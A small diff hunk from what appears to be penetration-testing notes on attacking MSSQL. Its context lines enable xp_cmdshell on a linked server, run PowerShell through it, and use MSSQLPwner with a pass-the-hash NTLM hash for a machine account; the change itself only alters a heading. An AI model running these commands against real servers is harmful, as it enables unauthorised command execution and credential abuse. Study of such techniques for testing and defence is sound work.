@@ -181,7 +181,7 @@ exec ('EXEC sp_configure ''xp_cmdshell'',1 RECONFIGURE') at SQL03
 EXEC('xp_cmdshell ''powershell whoami''') AT SQL03;
 ```
 
-### MSSQLPwner
+# MSSQLPwner
 Enumerate an MSSQL instance:
 - `mssqlpwner -hashes ':d38a856d6126f47a58ebfa34a4b70fef' 'WEB01$'@db01 -windows-auth interactive`
 
